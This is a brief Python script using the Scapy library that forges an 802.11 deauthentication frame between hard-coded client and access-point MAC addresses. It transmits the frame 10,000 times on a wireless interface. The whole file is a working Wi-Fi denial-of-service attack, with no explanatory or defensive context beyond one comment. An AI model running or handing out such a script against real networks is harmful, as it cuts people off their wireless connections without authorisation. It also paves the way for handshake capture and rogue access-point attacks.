from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from scapy.all import *



# Manually deauth packet send
pkt = RadioTap() / Dot11(addr1 = "80:a5:89:09:d5:c5", addr2 = "98:1E:19:7B:4D:8E", addr3="98:1E:19:7B:4D:8E") / Dot11Deauth()
sendp(pkt, iface="wlp0s20f0u3", count=10000, inter=.2)